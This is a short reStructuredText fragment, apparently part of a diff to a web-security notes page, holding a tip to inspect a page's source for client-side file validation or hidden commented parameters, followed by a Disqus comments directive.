+.. Tip :: Do check the source code of the page for any client-side file validation or any commented hidden parameters?
 
 .. disqus::
